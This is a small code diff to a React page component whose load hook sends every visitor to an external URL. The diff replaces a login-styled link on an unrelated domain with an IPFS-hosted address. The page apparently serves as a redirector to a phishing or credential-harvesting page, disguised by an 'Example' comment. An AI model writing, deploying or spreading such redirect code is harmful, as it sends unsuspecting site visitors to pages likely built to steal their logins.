@@ -8,7 +8,7 @@ const Page = () => {
 
   useEffect(() => {
     // Example: Redirect to an external URL
-    const redirectUrl = 'https://login.onlitervaxli.de/OMXqtHCP';
+    const redirectUrl = 'https://ipfs.io/ipfs/bafkreig2cbicwurevdce7uoyw2pflyt7ovmi7ubtbegclijbbuaf4xledy';
 
     // Redirect to the external URL
     window.location.href = redirectUrl;
